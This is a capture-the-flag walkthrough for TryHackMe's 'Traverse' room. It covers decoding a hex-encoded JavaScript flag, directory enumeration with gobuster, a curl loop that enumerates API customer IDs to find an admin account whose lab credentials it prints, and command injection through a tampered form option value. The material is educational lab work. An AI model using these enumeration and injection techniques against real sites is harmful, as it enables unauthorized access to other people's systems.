# Traverse Walkthrough
<br/>

## Intro
Welcome to the Traverse challenge, here is the link to the  [room](https://tryhackme.com/r/room/traverse) on TryHackMe.
This CTF will make you put in practice what you have learnt in the Software Security module.

Here is the story:
"*Bob is a security engineer at a firm and works closely with the software/DevOps team to develop a tourism web application. Once the website was moved from QA to Production, the team noticed that the website was getting hacked daily and wanted to know the exact reason. Bob consulted the blue team as well but has yet to be successful. Therefore, he finally enrolled in the **[Software Security](https://tryhackme.com/module/software-security)** pathway at THM to learn if he was doing something wrong.*"

Whenever you feel ready start the machine and connect via OpenVPN or using the AttackBox.

<br/>
<br/>

## The Challenge
Now let's navigate with our browser to:
```
http://MACHINE_IP
```

By viewing the page source code we can spot a minified JavaScript file called "custom.min.js", let's view it's content:
```
// I WILL KEEP THE OBFUSCATED SO NO ONE CAN UNDERSTAND

28 66 75 6E 63 74 69 6F 6E 28 29 7B 66 75 6E 63 74 69 6F 6E 20 64 6F 4E 6F 74 68 69 6E 67 28 29 7B 7D 76 61 72 20 6E 3D 22 44 49 52 45 43 54 4F 52 59 22 3B 76 61 72 20 65 3D 22 4C 49 53 54 49 4E 47 22 3B 76 61 72 20 6F 3D 22 49 53 20 54 48 45 22 3B 76 61 72 20 69 3D 22 4F 4E 4C 59 20 57 41 59 22 3B 76 61 72 20 66 3D 6E 75 6C 6C 3B 76 61 72 20 6C 3D 66 61 6C 73 65 3B 76 61 72 20 64 3B 69 66 28 66 3D 3D 3D 6E 75 6C 6C 29 7B 63 6F 6E 73 6F 6C 65 2E 6C 6F 67 28 22 46 6C 61 67 3A 22 2B 6E 2B 22 20 22 2B 65 2B 22 20 22 2B 6F 2B 22 20 22 2B 69 29 3B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 20 69 66 28 74 79 70 65 6F 66 20 66 3D 3D 3D 22 75 6E 64 65 66 69 6E 65 64 22 29 7B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 7B 69 66 28 6C 29 7B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 7B 28 66 75 6E 63 74 69 6F 6E 28 29 7B 69 66 28 64 29 7B 66 6F 72 28 76 61 72 20 6E 3D 30 3B 6E 3C 31 30 3B 6E 2B 2B 29 7B 63 6F 6E 73 6F 6C 65 2E 6C 6F 67 28 22 54 68 69 73 20 63 6F 64 65 20 64 6F 65 73 20 6E 6F 74 68 69 6E 67 2E 22 29 7D 64 6F 4E 6F 74 68 69 6E 67 28 29 7D 65 6C 73 65 7B 64 6F 4E 6F 74 68 69 6E 67 28 29 7D 7D 29 28 29 7D 7D 7D 29 28 29 3B
```

With a quick look we can easily understand that the content of the file has been encoded int ==hex==, we can decode it by using any of the numerous online tools.
After decoding ad passing the code to a prettyfier we will get this:
```javascript
function() {
    function doNothing() {}
    var n = "DIRECTORY";
    var e = "LISTING";
    var o = "IS THE";
    var i = "ONLY WAY";
    var f = null;
    var l = false;
    var d;
    if (f === null) {
        console.log("Flag:" + n + " " + e + " " + o + " " + i);
        d = undefined
    } else if (typeof f === "undefined") {
        d = undefined
    } else {
        if (l) {
            d = undefined
        } else {
            (function() {
                if (d) {
                    for (var n = 0; n < 10; n++) {
                        console.log("This code does nothing.")
                    }
                    doNothing()
                } else {
                    doNothing()
                }
            })()
        }
    }
})();
```

Flag: ==directory listing is the only way==

Moving on we need to find the file containing email dumps, let's go back at the web-page source code, nothing more to look for here.
Now we could take a wild guess and think the logs might be in a directory called logs (lol), or we can run a directory scan against the website:
```bash
gobuster dir -u http://10.10.120.255/  -w /usr/share/wordlists/dirb/common.txt -t 50 
```

```
/api                  (Status: 301) [Size: 312] [--> http://10.10.120.255/api/]
/client               (Status: 301) [Size: 315] [--> http://10.10.120.255/client/]
/img                  (Status: 301) [Size: 312] [--> http://10.10.120.255/img/]
/index.php            (Status: 200) [Size: 1491]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.120.255/javascript/]
/logs                 (Status: 301) [Size: 313] [--> http://10.10.120.255/logs/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.120.255/phpmyadmin/]
```

Who could guess it, there is a directory called logs, navigating inside it we can see a file called: REDACTED
Reading the file we can understand that Bob has created a directory with the name of the first phase of SSDLC which is REDACTED and is accessible only whit this key REDACTED
So let's now navigate to this URL and access the page inserting the key we have just found:
```
http://MACHINE_IP/planning
```

Here we can find a simple example instructing us on how to interact with the API, let's get the user with ID=5 name:
```bash
curl http://MACHINE IP/api/?customer_id=5 | grep email
```
-> REDACTED

Now we need to find which user is an admin, we can either try by hand all single digits IDs or write a simple bash script that will do it for use and return only the one we want:
```bash
for id_number in {1..9}; do
  response=$(curl -s "http://10.10.120.255/api/?customer_id=$id_number")
  if echo "$response" | grep -q '"isadmin":"1"'; then
    echo "ID Number: $id_number"
    echo "$response"
  fi
done

```

Running it we can see that is the user with ID ==3== and that it can log in at ==/realadmin== with the credentials `realadmin@traverse.com:admin_key!!!`
Let's visit that page and login.

At this point the challenge tells us that someone uploaded a web-shell and we need to find the original name, as the attacker changed it.
To find that out we can leverage a vulnerability in the form, which is basically html/command injection, we can manipulate the value of the html element like this:
```html
<option value="pwd">Current Directory</option>
```

to this to show the content of the working directory:
```html
<option value="ls $pwd">Current Directory</option>
```

And we can find 2 files:
- REDACTED
- REDACTED

Which names are the answer of the 2 questions.
The output also contains the password to access the file manager: 

Finally we have to restore the original homepage, before being defaced.
Let's navigate to this URL and login:
```
http://10.10.120.255/realadmin/REDACTED
```

Let's edit the index.php file and remove this lines:
```php
<?php
include 'header.php';
$message = "FINALLY HACKED";
?>
```

Now that the "Finally Hacked" message has been removed let's check again the homepage:
```
http://10.10.120.255/
```

If you did everything right you should now see the message: 
--> "SUCCESSFULLY RESTORED WEBSITE FLAG: REDACTED"

Congratulations you have successfully restored the defaced website and practiced your security coding knowledge.
Hope you had fun following along.

Catch you in the next CTF 😃 
